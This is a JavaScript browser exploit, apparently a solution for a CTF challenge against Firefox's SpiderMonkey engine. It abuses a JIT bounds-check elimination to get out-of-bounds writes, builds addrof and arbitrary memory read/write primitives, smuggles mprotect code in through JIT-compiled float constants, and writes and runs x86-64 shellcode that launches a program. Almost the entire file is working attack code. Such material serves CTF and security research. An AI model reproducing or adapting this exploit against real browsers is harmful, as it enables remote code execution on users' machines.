// This file is generated by Python script
////////////////////////////////////////////////////////////////////////////////////////////////////
// util.js

// https://org.anize.rs/corCTF-2021/pwn/outfoxed
let __converter = new ArrayBuffer(8);
let __u64view = new BigUint64Array(__converter);
let __f64view = new Float64Array(__converter);

// Bit-cast an uint64_t to a float64
function itod(x) {
    __u64view[0] = x;
    return __f64view[0];
}

// Bit-cast a float64 to an uint64_t
function dtoi(x) {
    __f64view[0] = x;
    return __u64view[0];
}

function hex(x) {
    if (x < 0) {
        return '-' + hex(-x);
    }
    return '0x' + x.toString(16).padStart(16, '0');
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

// Call the GC - Phoenhex function
function gc() {
	let __maxMallocBytes=128*1024*1024; // 128m
	for (var __i = 0; __i < 100; __i++) {
		var __gc_tmp = new ArrayBuffer(__maxMallocBytes); // Allocate locally, but don't save
	}
}

function log(msg) {
    // TODO: Add a HTML log output as well
    console.log(msg);
}

function dump(obj) {
    try {
        dumpObject(obj);
    } catch (e) {
        // nop
    }
}

function egghunt(start, max, egg1, egg2, step=1n) {
    log(`Searching from ${hex(start)} to ${hex(max)}`);
    // Convert the egg once, so it doesn't end up on the heap 4999 times
    let dEgg0 = dtoi(egg1);
    let dEgg1 = dtoi(egg2);
    for (let i = start; i < max - 8n; i+=step) {
        var tmp = r64(i);
        if (tmp == dEgg0) {
            tmp = r64(i + 8n)
            if (tmp == dEgg1) {
                return i;
            }
        }
    }
    return -1;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// exploit.js

var reader = new BigUint64Array(0x1000);
var a = new Array(0x40);
a.fill(1.1);
var b = new Array(0x40);
b.fill(2.2);
var c = new Array(0x40);
c.fill(3.3);
c.slot0 = itod(0x0000000000000000n)
c.slot1 = 3.3
c.slot2 = itod(0x0000000000000000n)

var uh = [];
var x = [1.1, 2.2, , 4.4];
x.__defineSetter__("-1", function() {
    a.length = 0;
    b.length = 0;
    c.length = 0;
    // Adding a bunch of persistent objects seems to work better than
    // just garbage collecting here. Not sure why.
    for (var i = 0; i < 0x800; i++) {
        uh.push(new Array(0x10));
    }
});

function pwn(idx, arg2, arg3, arg4) {
    // Step 1: Write here to add a bounds check for GVN to elim against
	a[arg2] = 1;
    a[arg2 - 1] = 1;

    // Step 2: Edit the size of 'a' and reallocate it
	x[idx] = 3.3;

    // OOB write to 'a;, since GVN thinks a's size is still the same.
    a[arg2 - 1] = arg3;
	a[arg2] = arg4;
}

const offset = 11;
for (var i = 0; i < 100000; i++) {
	x.length = 4;
	pwn(5, offset, 1.1, 1.1);
}

x.length = 4;
// Overwrite the size/capacity/initLength of b (was 0/0/6, now 0x10/0x10/0x10)
let new_size = 0x10n;
pwn(-1, offset, itod(new_size << 32n | new_size), itod(new_size));
// Now B's size is 0x10, and we can read/write OOB relative to B.

// Get a pointer to c's slots
var c_slot = dtoi(b[8]);
log("c_slot        : " + hex(c_slot));

if (c_slot === 0x7ff8000000000000n) {
    throw "[-] failed to leak c slot";
}

// JIT mprotector now, since we can't do this from eval context
const mprotector = (x) => [ 8.441747321662288e-149, 8.930537139822224e-149, 1.3479969217055813e-231, -5.877471923286753e-39, -6.272466154045844e-228, ];
const eggs = [ 8.441747321662288e-149, 8.930537139822224e-149, 1.3479969217055813e-231, -5.877471923286753e-39, -6.272466154045844e-228, ];
for (var i = 0; i < 100000; i+=1)
    mprotector(1.1);

// For some reason 'b' moves if the following code is _not_ in eval.
eval(`
function weak_read(addr) {
    var orig = b[8];
    b[8] = itod(addr);
    var ret = dtoi(c.slot0);
    b[8] = orig;
    return ret;
}

function addrof(obj) {
    var orig = c.slot1;
    c.slot1 = obj;
    var lower = weak_read(c_slot + 4n) >> 32n;
    var upper = (weak_read(c_slot + 12n) << 32n) & 0x0000ffffffffffffn;
    var pointer = (upper | lower);
    c.slot1 = orig;
    return pointer
}

function weak_write(addr, val) {
    var orig = b[8];
    b[8] = itod(addr);
    c.slot0 = itod(val);
    b[8] = orig;
}

var pReader = addrof(reader);
log("addrof reader : " + hex(pReader));
var pReaderBacking = pReader + 0x38n;
log("pReaderBacking: " + hex(pReaderBacking));

function r64(addr) {
    weak_write(pReaderBacking, addr);
    return reader[0];
}

function w64(addr, val) {
    weak_write(pReaderBacking, addr);
    reader[0] = val;
}

////////////////////////////////////////////////////////////////////////////////
// Step 2: stage some shellcode
var shellcode = [0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x50, 0x48, 0xb8, 0x2e, 0x79, 0x62, 0x60, 0x6d, 0x62, 0x01, 0x01, 0x48, 0x31, 0x04, 0x24, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x3b, 0x31, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01, 0x01, 0x01, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x31, 0xd2, 0x52, 0x6a, 0x08, 0x5a, 0x48, 0x01, 0xe2, 0x52, 0x48, 0x89, 0xe2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05];

var page = new Uint8Array(0x1000);
var pPage = addrof(page);
console.log("page          : " + hex(pPage));
var pBackingPage = pPage + 0x38n;
var backingPage = r64(pBackingPage);
console.log("BackingPage   : " + hex(pBackingPage) + " -> " + hex(backingPage));

var pMprotector = addrof(mprotector);
console.log("func          : " + hex(pMprotector))

var pppCode = pMprotector + 0x30n;
var ppCode = r64(pppCode);
var pCode = r64(ppCode);
console.log("Code          : " + hex(pppCode) + " -> " + hex(ppCode) + " -> " + hex(pCode));

var start = pCode;
start = start & 0xfffffffffffff000n;
start -= 0x4000n;
var pJitCode = egghunt(start, start + 0x100000n, eggs[0], eggs[1], step=0x8n);
if (pJitCode == -1) {
    console.log("Failed to find JIT code");
} else {
    pJitCode = pJitCode + 0x10n;
    console.log("Found mprotect: " + hex(pJitCode));
    w64(ppCode, pJitCode);

    // Make the backing page RWX
    mprotector(itod(backingPage));

    // Copy the shellcode to the backing page
    for (var i = 0; i < shellcode.length; i++) {
        page[i] = shellcode[i];
    }

    // Trigger the shellcode
    log("Triggering shellcode")
    w64(ppCode, backingPage)
    mprotector(1.1);
}
`);
